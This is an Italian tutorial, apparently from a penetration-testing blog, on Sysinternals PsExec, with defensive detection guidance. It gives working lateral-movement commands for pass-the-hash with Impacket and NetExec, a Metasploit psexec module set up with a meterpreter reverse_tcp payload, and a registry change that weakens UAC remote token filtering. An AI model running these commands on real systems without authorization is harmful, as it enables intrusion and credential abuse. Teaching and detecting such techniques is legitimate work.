---
title: 'PsExec su Windows: Download, Comandi e Guida Completa'
slug: psexec
description: 'PsExec su Windows: download ufficiale, installazione, sintassi e comandi remoti. Guida a PowerShell, PSEXESVC.exe, Pass-the-Hash con Impacket e detection.'
image: /psexec-windows-download-comandi-lateral-movement.webp
draft: false
date: 2026-02-21T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - PsExec
  - Sysinternals
  - Windows
  - Active Directory
  - Lateral Movement
---

# PsExec su Windows: come funziona, comandi, esecuzione remota e tecniche offensive

**PsExec** è il tool di Microsoft Sysinternals (`sysinternals psexec`) che esegue comandi e processi su computer Windows da remoto, sfruttando il protocollo `SMB`. Non serve installare nessun agent sul target: bastano credenziali amministrative valide. Nato per i system administrator, in un penetration test è uno dei modi più rapidi per passare da una macchina compromessa a un'altra, cioè per fare [movimento laterale](https://hackita.it/articoli/lateral-movement/).

Se cerchi "cos'è psexec", "psexec download" o "come usare psexec" (`ps exec`), qui trovi tutto: download ufficiale, installazione, sintassi, comandi, esecuzione remota di CMD e PowerShell, pass the hash con Impacket, uso in Active Directory e rilevamento lato blue team.

*Usa queste tecniche solo su sistemi tuoi o con autorizzazione scritta: l'accesso abusivo a un sistema informatico è reato (art. 615-ter c.p.).*

## Cos'è PsExec e come funziona

PsExec è una "telnet leggera" per Windows: esegue un processo su un altro computer, con console interattiva, senza installare client sul target. Fa parte di PsTools, la suite Sysinternals di tool a riga di comando per amministrare sistemi locali e remoti.

Non fa nulla di magico: usa componenti che Windows ha già.

* Si connette via `SMB` (porta 445) alle share nascoste `IPC$` e `ADMIN$` del target
* Copia il binario `PSEXESVC.exe` nella cartella Windows (la share `ADMIN$` punta a `C:\Windows`)
* Chiede il servizio al `Service Control Manager` (tradotto: il gestore dei servizi di Windows) e lo avvia
* Apre una `named pipe` (tradotto: canale di comunicazione tra processi) per passare input e output
* Esegue il comando e ti restituisce l'output
* Alla fine ferma il servizio e cancella il binario

![PsExec attack flow from SMB upload to service execution](data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgMTAwMCAzODAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgZm9udC1mYW1pbHk9IkFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWYiPgogIDxkZWZzPgogICAgPG1hcmtlciBpZD0iYXJyb3ciIHZpZXdCb3g9IjAgMCAxMCAxMCIgcmVmWD0iOSIgcmVmWT0iNSIgbWFya2VyV2lkdGg9IjgiIG1hcmtlckhlaWdodD0iOCIgb3JpZW50PSJhdXRvLXN0YXJ0LXJldmVyc2UiPgogICAgICA8cGF0aCBkPSJNMCwwIEwxMCw1IEwwLDEwIHoiIGZpbGw9IiNmZmZmZmYiIC8+CiAgICA8L21hcmtlcj4KICAgIDxtYXJrZXIgaWQ9ImFycm93UmVkIiB2aWV3Qm94PSIwIDAgMTAgMTAiIHJlZlg9IjkiIHJlZlk9IjUiIG1hcmtlcldpZHRoPSI4IiBtYXJrZXJIZWlnaHQ9IjgiIG9yaWVudD0iYXV0by1zdGFydC1yZXZlcnNlIj4KICAgICAgPHBhdGggZD0iTTAsMCBMMTAsNSBMMCwxMCB6IiBmaWxsPSIjZmYwMTAzIiAvPgogICAgPC9tYXJrZXI+CiAgPC9kZWZzPgogIDxyZWN0IHg9IjAiIHk9IjAiIHdpZHRoPSIxMDAwIiBoZWlnaHQ9IjM4MCIgZmlsbD0iIzZiMDAwMSIgLz4KICA8cmVjdCB4PSIyMCIgeT0iNjAiIHdpZHRoPSIxODAiIGhlaWdodD0iOTAiIGZpbGw9IiMwMDAwMDAiIHN0cm9rZT0iI2ZmMDEwMyIgc3Ryb2tlLXdpZHRoPSIyIiAvPgogIDx0ZXh0IHg9IjExMCIgeT0iOTUiIGZvbnQtc2l6ZT0iMTYiIGZvbnQtd2VpZ2h0PSI3MDAiIGZpbGw9IiNmZmZmZmYiIHRleHQtYW5jaG9yPSJtaWRkbGUiPkF0dGFja2VyPC90ZXh0PgogIDx0ZXh0IHg9IjExMCIgeT0iMTE4IiBmb250LXNpemU9IjE2IiBmb250LXdlaWdodD0iNzAwIiBmaWxsPSIjZmZmZmZmIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5NYWNoaW5lPC90ZXh0PgogIDxyZWN0IHg9IjI0MCIgeT0iNjAiIHdpZHRoPSIyMDAiIGhlaWdodD0iOTAiIGZpbGw9IiMwMDAwMDAiIHN0cm9rZT0iI2ZmMDEwMyIgc3Ryb2tlLXdpZHRoPSIyIiAvPgogIDx0ZXh0IHg9IjM0MCIgeT0iOTUiIGZvbnQtc2l6ZT0iMTUiIGZvbnQtd2VpZ2h0PSI3MDAiIGZpbGw9IiNmZmZmZmYiIHRleHQtYW5jaG9yPSJtaWRkbGUiPlNNQiBQb3J0IDQ0NTwvdGV4dD4KICA8dGV4dCB4PSIzNDAiIHk9IjExOCIgZm9udC1zaXplPSIxNSIgZm9udC13ZWlnaHQ9IjcwMCIgZmlsbD0iI2ZmZmZmZiIgdGV4dC1hbmNob3I9Im1pZGRsZSI+QWRtaW4gU2hhcmUgVXBsb2FkPC90ZXh0PgogIDxyZWN0IHg9IjQ4MCIgeT0iNjAiIHdpZHRoPSIyMjAiIGhlaWdodD0iOTAiIGZpbGw9IiMwMDAwMDAiIHN0cm9rZT0iI2ZmMDEwMyIgc3Ryb2tlLXdpZHRoPSIyIiAvPgogIDx0ZXh0IHg9IjU5MCIgeT0iOTUiIGZvbnQtc2l6ZT0iMTUiIGZvbnQtd2VpZ2h0PSI3MDAiIGZpbGw9IiNmZmZmZmYiIHRleHQtYW5jaG9yPSJtaWRkbGUiPlNlcnZpY2UgQ29udHJvbDwvdGV4dD4KICA8dGV4dCB4PSI1OTAiIHk9IjExOCIgZm9udC1zaXplPSIxNSIgZm9udC13ZWlnaHQ9IjcwMCIgZmlsbD0iI2ZmZmZmZiIgdGV4dC1hbmNob3I9Im1pZGRsZSI+TWFuYWdlcjwvdGV4dD4KICA8cmVjdCB4PSI3NDAiIHk9IjYwIiB3aWR0aD0iMjIwIiBoZWlnaHQ9IjkwIiBmaWxsPSIjMDAwMDAwIiBzdHJva2U9IiNmZjAxMDMiIHN0cm9rZS13aWR0aD0iMiIgLz4KICA8dGV4dCB4PSI4NTAiIHk9Ijk1IiBmb250LXNpemU9IjE1IiBmb250LXdlaWdodD0iNzAwIiBmaWxsPSIjZmZmZmZmIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5QU0VYRVNWQzwvdGV4dD4KICA8dGV4dCB4PSI4NTAiIHk9IjExOCIgZm9udC1zaXplPSIxNSIgZm9udC13ZWlnaHQ9IjcwMCIgZmlsbD0iI2ZmZmZmZiIgdGV4dC1hbmNob3I9Im1pZGRsZSI+U2VydmljZSBSdW5uaW5nPC90ZXh0PgogIDxsaW5lIHgxPSIyMDAiIHkxPSIxMDUiIHgyPSIyMzgiIHkyPSIxMDUiIHN0cm9rZT0iI2ZmZmZmZiIgc3Ryb2tlLXdpZHRoPSIyIiBtYXJrZXItZW5kPSJ1cmwoI2Fycm93KSIgLz4KICA8bGluZSB4MT0iNDQwIiB5MT0iMTA1IiB4Mj0iNDc4IiB5Mj0iMTA1IiBzdHJva2U9IiNmZmZmZmYiIHN0cm9rZS13aWR0aD0iMiIgbWFya2VyLWVuZD0idXJsKCNhcnJvdykiIC8+CiAgPGxpbmUgeDE9IjcwMCIgeTE9IjEwNSIgeDI9IjczOCIgeTI9IjEwNSIgc3Ryb2tlPSIjZmZmZmZmIiBzdHJva2Utd2lkdGg9IjIiIG1hcmtlci1lbmQ9InVybCgjYXJyb3cpIiAvPgogIDxyZWN0IHg9IjQ4MCIgeT0iMjMwIiB3aWR0aD0iMjIwIiBoZWlnaHQ9IjkwIiBmaWxsPSIjMDAwMDAwIiBzdHJva2U9IiNmZjAxMDMiIHN0cm9rZS13aWR0aD0iMyIgLz4KICA8dGV4dCB4PSI1OTAiIHk9IjI2NSIgZm9udC1zaXplPSIxNSIgZm9udC13ZWlnaHQ9IjcwMCIgZmlsbD0iI2ZmMDEwMyIgdGV4dC1hbmNob3I9Im1pZGRsZSI+RXZlbnQgSUQgNzA0NTwvdGV4dD4KICA8dGV4dCB4PSI1OTAiIHk9IjI4OCIgZm9udC1zaXplPSIxNSIgZm9udC13ZWlnaHQ9IjcwMCIgZmlsbD0iI2ZmMDEwMyIgdGV4dC1hbmNob3I9Im1pZGRsZSI+RGV0ZWN0aW9uIFBvaW50PC90ZXh0PgogIDxsaW5lIHgxPSI1OTAiIHkxPSIxNTAiIHgyPSI1OTAiIHkyPSIyMjgiIHN0cm9rZT0iI2ZmMDEwMyIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtZGFzaGFycmF5PSI2LDQiIG1hcmtlci1lbmQ9InVybCgjYXJyb3dSZWQpIiAvPgogIDx0ZXh0IHg9IjEzMCIgeT0iMzUwIiBmb250LXNpemU9IjE0IiBmb250LXdlaWdodD0iNDAwIiBmaWxsPSIjZmZmZmZmIiB0ZXh0LWFuY2hvcj0ic3RhcnQiPk5hbWVkIHBpcGUgY29tbXVuaWNhdGlvbiBjYXJyaWVzIGNvbW1hbmQgb3V0cHV0IGJhY2sgdG8gdGhlIGF0dGFja2VyPC90ZXh0Pgo8L3N2Zz4K)

Gli artifact lasciati sul target sono il servizio, il binario (temporaneo) e la named pipe. Sono anche il punto debole di PsExec: più avanti vedi come si rilevano.

## Download PsExec: scaricare PsExec.exe da Sysinternals

Il download sicuro è uno solo: la pagina ufficiale Microsoft, [learn.microsoft.com/sysinternals/downloads/psexec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec). Scarichi l'archivio `PSTools.zip` (circa 5 MB), versione attuale v2.43. Evita siti terzi: `psexec.exe` è un bersaglio classico per chi distribuisce versioni manomesse.

```powershell
# Download the full PSTools suite from the official Sysinternals host
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/PSTools.zip" -OutFile PSTools.zip

# Extract the archive
Expand-Archive PSTools.zip -DestinationPath C:\Tools\PSTools\

# List the extracted files
Get-ChildItem C:\Tools\PSTools\
```

Nell'archivio trovi sia `PsExec.exe` sia `PsExec64.exe`: su sistemi a 64 bit puoi usare quello a 64 bit, ma anche `PsExec.exe` funziona. Microsoft indica come sistemi supportati Windows 8.1 e successivi lato client, Windows Server 2012 e successivi lato server: su Windows 7 la versione attuale non è supportata ufficialmente.

### Installare PsExec e PsTools

PsExec non ha un installer. Microsoft dice di copiarlo in una cartella del `PATH` e di lanciarlo:

```cmd
:: Copy the executable into a folder that is already in PATH
copy C:\Tools\PSTools\PsExec.exe C:\Windows\System32\

:: First run: accept the license once so scripts do not hang on the EULA dialog
psexec -accepteula
```

Se usi Chocolatey, l'intera suite si installa con `choco install pstools`. PsTools contiene anche altri tool utili in un engagement, come `PsList`, `PsKill`, `PsService`, `PsLoggedOn` e `PsInfo`, che funzionano con la stessa logica `\\computer -u -p`.

### Impacket psexec.py su Linux

Per il lato offensivo, da Kali o da un'altra distro Linux, usi `psexec.py` di [Impacket](https://hackita.it/articoli/impacket/). Non è lo stesso programma: replica il comportamento con un binario open source, RemCom, al posto di `PSEXESVC.exe`.

```bash
# Install Impacket from PyPI
pip3 install impacket

# Or install from source
git clone https://github.com/fortra/impacket.git
cd impacket
pip3 install .

# Show the options
psexec.py -h
```

## Requisiti, SMB e porta 445

Sul target servono la porta 445/TCP aperta, credenziali di un amministratore locale (o di dominio) e una share `ADMIN$` raggiungibile e scrivibile.

| Requisito     | Dettaglio                               |
| ------------- | --------------------------------------- |
| Porta 445/TCP | `SMB`, quella che usi quasi sempre      |
| Porta 139/TCP | Alternativa su Impacket con `-port 139` |
| Credenziali   | Administrator locale o Domain Admin     |
| Share         | `ADMIN$` raggiungibile e scrivibile     |
| SMB signing   | Non blocca PsExec, ferma solo il relay  |

```bash
# Check that SMB is reachable
nc -zv 192.168.10.50 445

# List shares with valid credentials
smbclient -L //192.168.10.50 -U administrator
```

### Windows Admin Shares

Le `Windows Admin Shares` (tradotto: condivisioni amministrative) sono share nascoste create da Windows in automatico: `C$` (la radice del disco), `ADMIN$` (la cartella `C:\Windows`) e `IPC$` (usata per le named pipe). Vi accedono solo gli amministratori. PsExec scrive `PSEXESVC.exe` in `ADMIN$` e comunica tramite `IPC$`: se uno dei due è bloccato, PsExec non parte. Puoi testare l'accesso prima di lanciarlo, e ti conferma anche se le credenziali sono valide:

```cmd
net use \\192.168.10.50\ADMIN$ /user:CORP\administrator Summer2026!
```

### Autenticazione NTLM e Service Execution

Sopra SMB l'autenticazione avviene con Kerberos oppure con `NTLM`. Se ti colleghi per indirizzo IP e non per nome host, di solito il client ripiega su NTLM: è il caso tipico di un pentest. In NTLM il "segreto" usato per autenticarsi è l'hash della password, ed è per questo che funziona il [pass the hash](https://hackita.it/articoli/pass-the-hash/): se hai l'hash, non ti serve la password.

Dopo l'autenticazione, PsExec fa quella che in gergo si chiama `Service Execution` (tradotto: esecuzione tramite servizio): crea un servizio sul target chiamando il Service Control Manager via RPC sulla pipe `\pipe\svcctl`, e il servizio lancia il tuo comando come SYSTEM o con l'utente scelto. Lo stesso meccanismo è alla base di Impacket `psexec.py`, di [smbexec](https://hackita.it/articoli/smbexec/) e del modulo Metasploit. Per approfondire il protocollo c'è l'articolo su [SMB](https://hackita.it/articoli/smb/).

## Sintassi e parametri di PsExec

```cmd
psexec [\\computer[,computer2[,...] | @file]] [-u user [-p password]] [-s|-e] [-i [session]] [-c [-f|-v]] [-d] [-r servicename] [-h] [-l] [-w directory] [-n timeout] [-accepteula] [-nobanner] cmd [arguments]
```

| Parametro       | Funzione                                                                                               |
| --------------- | ------------------------------------------------------------------------------------------------------ |
| `\\computer`    | Hostname o IP del target. Omesso = esecuzione locale. Con `\\*` esegue su tutti i computer del dominio |
| `@file`         | Esegue il comando su ogni host elencato nel file                                                       |
| `-u` / `-p`     | Username e password. Senza `-p` la password viene chiesta in modo nascosto                             |
| `-s`            | Esegue il processo come SYSTEM                                                                         |
| `-i [sessione]` | Fa interagire il processo con il desktop della sessione indicata                                       |
| `-c`            | Copia l'eseguibile locale sul target prima di lanciarlo                                                |
| `-f`            | Forza la copia anche se il file esiste già                                                             |
| `-v`            | Copia solo se il file locale è più recente                                                             |
| `-d`            | Non attende la fine del processo                                                                       |
| `-r nome`       | Nome custom del servizio                                                                               |
| `-h`            | Su Vista e successivi usa il token elevato dell'account, se disponibile                                |
| `-l`            | Esegue come utente limitato                                                                            |
| `-w directory`  | Imposta la working directory remota                                                                    |
| `-n secondi`    | Timeout di connessione                                                                                 |
| `-e`            | Non carica il profilo dell'account                                                                     |
| `-x`            | Mostra la UI sul desktop sicuro di Winlogon (solo locale)                                              |
| `-a n,n`        | Fissa l'affinità su CPU specifiche                                                                     |
| `-accepteula`   | Salta la finestra dell'EULA                                                                            |
| `-nobanner`     | Niente banner iniziale                                                                                 |

Due note pratiche. Senza `-u`, il processo gira con il tuo account ma senza accesso alle risorse di rete (impersonation); con `-u DOMINIO\utente` ottieni anche l'accesso alla rete. Microsoft precisa che password e comando viaggiano cifrati verso il target, ma la password che scrivi con `-p` resta nella riga di comando locale: finisce nella cronologia e nei log di creazione processo (Event ID 4688, Sysmon 1). In un engagement vero preferisci farla chiedere in modo nascosto, omettendo `-p`.

## Comandi PsExec: esempi pratici

### Comando singolo

```cmd
PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! -accepteula whoami
```

```text
Starting whoami on 192.168.10.50...
whoami exited on 192.168.10.50 with error code 0.
corp\administrator
```

### Esecuzione come SYSTEM

```cmd
PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! -s cmd.exe
```

```text
C:\Windows\system32> whoami
nt authority\system
```

Con `-s` il processo parte come SYSTEM: privilegi massimi sulla macchina, incluso l'accesso a LSASS. Questa è la differenza fondamentale rispetto a un semplice account amministratore.

### Più target in una volta

```cmd
echo 192.168.10.51 > targets.txt
echo 192.168.10.52 >> targets.txt
PsExec.exe @targets.txt -u CORP\administrator -p Summer2026! hostname
```

### Sessione interattiva sul desktop

Il parametro `-i` serve quando il programma deve apparire sul desktop della sessione del target (per esempio un'applicazione grafica). Per una normale shell da riga di comando non serve.

```cmd
PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! -i 1 notepad.exe
```

## PsExec Remote Command Prompt: eseguire CMD da remoto

Il caso d'uso più classico di `psexec cmd`: una shell a riga di comando sul computer remoto, per eseguire comandi su Windows da remoto (`remote command execution`).

```cmd
PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! cmd.exe
```

```text
Microsoft Windows [Version 10.0.19045.3803]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> hostname
WKSTN-FINANCE-02
```

Se invece ti serve un singolo comando e poi uscire, passalo come argomento. Il percorso dei file deve essere assoluto sul target:

```cmd
:: Network configuration
PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! ipconfig /all

:: Logged-on users
PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! query user

:: Local administrators group
PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! net localgroup administrators

:: Run a command that needs cmd.exe features such as pipes
PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! cmd /c "dir C:\Users | findstr /i admin"
```

## PsExec con PowerShell: eseguire script da remoto

PsExec non ha un parametro dedicato a PowerShell: gli passi `powershell.exe` come programma da eseguire (`psexec powershell`). Per un comando singolo:

```cmd
PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-Process | Select-Object -First 5"
```

Per eseguire uno script `.ps1`, prima lo copi sul target tramite la share amministrativa, poi lo lanci con il suo percorso assoluto. Il parametro `-c` di PsExec serve solo per copiare ed eseguire un eseguibile, non uno script:

```cmd
copy C:\Tools\inventory.ps1 \\192.168.10.50\C$\Windows\Temp\inventory.ps1
PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\inventory.ps1
```

Con `-s` lo script gira come SYSTEM. Se invece parti da Linux, `psexec.py` accetta il comando direttamente come argomento (`psexec.py ... "powershell.exe -c Get-Date"`).

## Eseguire EXE e batch file da remoto

Con `-c` PsExec copia l'eseguibile locale sul target (nella cartella Windows, via `ADMIN$`) e lo esegue:

```cmd
:: Copy and run a local executable
PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! -c C:\Tools\agent.exe

:: Same, but do not wait for it to finish
PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! -d -c C:\Tools\agent.exe

:: Overwrite a copy that already exists on the target
PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! -c -f C:\Tools\agent.exe
```

Per un file batch già presente sul target, lo lanci tramite `cmd /c` con il percorso assoluto:

```cmd
PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! cmd /c C:\Scripts\cleanup.bat
```

Questo è anche il modo in cui gruppi ransomware reali (per esempio Medusa) usano PsExec: copiano uno script batch sui target e lo eseguono come SYSTEM su decine di macchine in pochi secondi.

## Installare software MSI da remoto

Anche qui `-c` non va usato con un `.msi`, perché un pacchetto MSI non è un eseguibile: si copia il file sul target e si chiama `msiexec` con il percorso assoluto.

```cmd
copy C:\Installers\7z2501-x64.msi \\192.168.10.50\C$\Windows\Temp\7z2501-x64.msi
PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! msiexec /i C:\Windows\Temp\7z2501-x64.msi /qn /norestart
```

`/qn` installa senza interfaccia grafica e `/norestart` evita il riavvio. È un metodo usato davvero per distribuire software, ed è lo stesso schema con cui un attaccante piazza un payload che si finge un aggiornamento.

## PsExec in Active Directory e lateral movement

In un engagement su [Active Directory](https://hackita.it/articoli/active-directory/), PsExec si colloca nella fase di movimento laterale (MITRE ATT\&CK T1021.002, SMB/Windows Admin Shares): dopo aver ottenuto credenziali amministrative con [Kerberoasting](https://hackita.it/articoli/kerberoasting/), [dump delle credenziali](https://hackita.it/articoli/credential-dumping/) o un attacco su [Kerberos](https://hackita.it/articoli/kerberos/), lo usi per spostarti da una macchina all'altra.

```cmd
PsExec.exe \\DC01.corp.local -u CORP\administrator -p Summer2026! cmd.exe
```

Con accesso a un Domain Controller, il passo tipico è un [DCSync](https://hackita.it/articoli/dcsync/) per estrarre tutti gli hash del dominio. Prima, con [BloodHound](https://hackita.it/articoli/bloodhound/) puoi mappare quali host ti avvicinano di più a un Domain Admin, così non spruzzi PsExec a caso su tutta la rete (e non generi rumore inutile).

## Pass-the-Hash con Impacket PsExec

Il PsExec di Sysinternals vuole una password in chiaro. Per il `pass the hash`, cioè autenticarti con il solo hash NTLM senza conoscere la password, serve `psexec.py` di [Impacket](https://hackita.it/articoli/impacket/).

```bash
psexec.py -hashes :41aed72cec76816423703d8e545eea31 CORP/administrator@192.168.10.50
```

```text
[*] Requesting shares on 192.168.10.50.....
[*] Found writable share ADMIN$
[*] Uploading file hKpLm9xQ.exe
[*] Opening SVCManager on 192.168.10.50.....
[*] Creating service aBcD on 192.168.10.50.....
[*] Starting service aBcD.....
[!] Press help for extra shell commands

C:\Windows\system32> whoami
nt authority\system
```

Dopo i due punti c'è l'hash NT (la parte LM prima dei due punti si lascia vuota). Con la password invece, mettila tra apici singoli, perché la shell Bash interpreta il `!`:

```bash
psexec.py 'CORP/administrator:Summer2026!@192.168.10.50'
```

Con Kerberos, partendo da un ticket già in cache:

```bash
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass CORP.LOCAL/administrator@fileserver01.corp.local
```

Nota il nome del servizio e del binario caricati: sono casuali a ogni esecuzione, a differenza del `PSEXESVC` fisso di PsExec. Se vuoi scegliere tu i nomi, Impacket ha `-service-name` e `-remote-binary-name`. Il flusso tipico, dopo aver estratto un hash con [Mimikatz](https://hackita.it/articoli/mimikatz/):

```bash
# Validate the hash on the whole subnet; "Pwn3d!" marks admin access
nxc smb 192.168.10.0/24 -u administrator -H 41aed72cec76816423703d8e545eea31

# Pass the hash onto a host that answered Pwn3d!
psexec.py -hashes :41aed72cec76816423703d8e545eea31 CORP/administrator@192.168.10.52
```

La validazione di massa si fa con [NetExec](https://hackita.it/articoli/netexec/) (il successore di [CrackMapExec](https://hackita.it/articoli/crackmapexec/)). Se preferisci non copiare nessun binario sul target, [smbexec](https://hackita.it/articoli/smbexec/) e [wmiexec](https://hackita.it/articoli/wmiexec/) fanno lo stesso lavoro con meno impronta.

## PsExec con Metasploit

[Metasploit](https://hackita.it/articoli/metasploit/) ha il modulo `exploit/windows/smb/psexec`, che automatizza upload, creazione del servizio e sessione, e accetta sia password sia hash NTLM.

```text
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.10.50
msf6 exploit(windows/smb/psexec) > set SMBDomain CORP
msf6 exploit(windows/smb/psexec) > set SMBUser administrator
msf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:41aed72cec76816423703d8e545eea31
msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set LHOST 192.168.10.5
msf6 exploit(windows/smb/psexec) > run
```

Sotto il cofano fa quello che hai già visto: `ADMIN$`, servizio, named pipe. È comodo quando vuoi direttamente una sessione Meterpreter invece di una semplice shell. Il modulo ha però un payload eseguibile da caricare sul target, quindi un antivirus lo ferma più facilmente di una shell `psexec.py`.

## PSEXESVC.exe: cos'è, come funziona e come rilevarlo

`PSEXESVC.exe` (a volte cercato come `psexecsvc exe`) è il servizio che PsExec installa sul target. Il binario è incorporato dentro `PsExec.exe`: al momento dell'esecuzione viene copiato in `ADMIN$`, cioè in `C:\Windows\PSEXESVC.exe`, registrato come servizio chiamato `PSEXESVC` e avviato. È il programma che riceve il tuo comando dalla pipe, lo esegue e rimanda l'output.

| Elemento             | Valore tipico                                          |
| -------------------- | ------------------------------------------------------ |
| Servizio             | `PSEXESVC` (cambia con `-r`)                           |
| Percorso del binario | `C:\Windows\PSEXESVC.exe`                              |
| Account del servizio | `LocalSystem`                                          |
| Tipo di avvio        | manuale (`demand start`)                               |
| Named pipe           | `\PSEXESVC` e `\PSEXESVC-HOST-PID-stdin/stdout/stderr` |

Di solito sparisce da solo a fine esecuzione. Se la connessione si interrompe o il processo viene ucciso, può restare il servizio o il file: controlli e pulisci (sul tuo lab o sul sistema autorizzato) così:

```cmd
sc query PSEXESVC
sc stop PSEXESVC
sc delete PSEXESVC
del C:\Windows\PSEXESVC.exe
```

Come distinguere l'uso legittimo da uno malevolo? Il vero `PSEXESVC.exe` è firmato da Microsoft: se la firma manca o non è valida, è un campanello d'allarme.

```powershell
# Check the digital signature of the service binary
Get-AuthenticodeSignature C:\Windows\PSEXESVC.exe | Format-List Status, SignerCertificate
```

Anche se firmato, la sua presenza su una workstation dove nessun amministratore lo usa è già un indicatore. Microsoft stessa avverte che molti antivirus segnalano PsTools come "remote admin": i tool non contengono virus, ma sono stati usati dai virus, e per questo scatta l'allarme. Gli equivalenti Impacket usano invece nomi casuali per servizio e binario, e pipe `RemCom_*` al posto di `PSEXESVC`, quindi una regola basata solo sul nome `PSEXESVC` non li vede.

## PsExec vs WMIExec, SMBExec e WinRM

| Tool                                                 | Protocollo   | Copia un binario    | Crea un servizio    | Discrezione | Pass the Hash |
| ---------------------------------------------------- | ------------ | ------------------- | ------------------- | ----------- | ------------- |
| PsExec (Sysinternals)                                | SMB 445      | Sì (`PSEXESVC.exe`) | Sì                  | Bassa       | No            |
| psexec.py (Impacket)                                 | SMB 445      | Sì (nome casuale)   | Sì                  | Bassa/media | Sì            |
| [smbexec](https://hackita.it/articoli/smbexec/)      | SMB 445      | No                  | Sì (a ogni comando) | Media       | Sì            |
| [wmiexec](https://hackita.it/articoli/wmiexec/)      | RPC/WMI 135  | No                  | No                  | Alta        | Sì            |
| [dcomexec](https://hackita.it/articoli/dcomexec/)    | RPC/DCOM 135 | No                  | No                  | Alta        | Sì            |
| [Evil-WinRM](https://hackita.it/articoli/evilwinrm/) | HTTP 5985    | No                  | No                  | Media       | Sì            |
| [SSH](https://hackita.it/articoli/ssh/)              | TCP 22       | No                  | No                  | Molto alta  | No            |

**PsExec vs WMIExec.** `wmiexec` non crea servizi e non copia binari, quindi non genera l'Event ID 7045: è la scelta quando vuoi essere discreto. Contro: usa RPC (porta 135 più porte dinamiche) e scrive l'output in un file temporaneo.

**PsExec vs SMBExec.** `smbexec` usa lo stesso canale SMB ma non lascia un binario su disco: crea un servizio per ogni comando. Meno artifact sul filesystem, ma più eventi di creazione servizio.

**PsExec vs WinRM.** WinRM usa HTTP/HTTPS (porte 5985/5986) ed è di solito attivo sui server, non sui client Windows. Ti dà una PowerShell remota completa e non crea servizi. PsExec resta utile quando SMB è aperto ma WinRM e RPC sono bloccati, o quando vuoi eseguire come SYSTEM con una sola riga.

Se la discrezione non è una priorità in quella fase dell'engagement, PsExec resta la scelta più diretta e affidabile.

## Rilevamento di PsExec: Event ID 7045 e Windows Logs

Per il blue team PsExec non è invisibile. Gli indicatori principali:

| Evento                      | Log      | Cosa indica                                                                                                    |
| --------------------------- | -------- | -------------------------------------------------------------------------------------------------------------- |
| Event ID 7045               | System   | Nuovo servizio installato (per PsExec: `ServiceName: PSEXESVC`)                                                |
| Event ID 4697               | Security | Servizio installato, se l'audit è attivo                                                                       |
| Event ID 4624, Logon Type 3 | Security | Accesso di rete sul target, vedi i [tipi di logon di Windows](https://hackita.it/articoli/logon-type-windows/) |
| Event ID 4672               | Security | Privilegi speciali assegnati alla sessione                                                                     |
| Event ID 5145               | Security | Accesso alla share `ADMIN$` (serve l'audit delle share)                                                        |
| Sysmon Event ID 11          | Sysmon   | Creazione del file `PSEXESVC.exe`                                                                              |
| Sysmon Event ID 17 e 18     | Sysmon   | Named pipe creata e connessa, pattern `PSEXESVC`                                                               |

L'Event ID 7045 è il più affidabile: ogni volta che PsExec (o un tool equivalente) crea un servizio, nel log System compaiono nome del servizio, percorso del binario e account. Lo stesso evento è alla base delle regole di rilevamento del movimento laterale via servizi, ed è per questo che le campagne ransomware che abusano di PsExec lasciano sempre una traccia in 7045. Per cercarlo sul target:

```powershell
# Look for PSEXESVC service installations in the System log
Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} |
    Where-Object { $_.Message -match 'PSEXESVC' } |
    Select-Object TimeCreated, Message
```

Un nome di servizio custom con `-r` riduce il match sulle firme statiche, ma non elimina l'evento:

```cmd
PsExec.exe \\192.168.10.50 -u CORP\administrator -p Summer2026! -r WindowsUpdateSvc cmd.exe
```

L'Event ID 7045 scatta lo stesso, con `ServiceName: WindowsUpdateSvc`. Per questo una regola di detection seria non guarda solo il nome ma un insieme di segnali: servizio creato da un accesso di rete (Logon Type 3), binario in `C:\Windows` appena scritto da `ADMIN$`, pipe anomale.

## Risoluzione problemi PsExec: errori comuni

**"Access is denied" / "System error 5 has occurred"**
Credenziali sbagliate, oppure l'account non è amministratore locale. Verifica con `net use \\target\ADMIN$ /user:DOMINIO\utente password`. Su Windows con UAC il filtro sul token remoto (`LocalAccountTokenFilterPolicy`, valore 0 di default) toglie i privilegi amministrativi agli account locali, anche se sono nel gruppo Administrators: funziona con un account di dominio amministratore, oppure impostando il valore a 1 su una macchina di laboratorio. Fuori dal lab, riduce la sicurezza: non farlo senza motivo.

```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

**"Couldn't install PsExec service: Access is denied"**
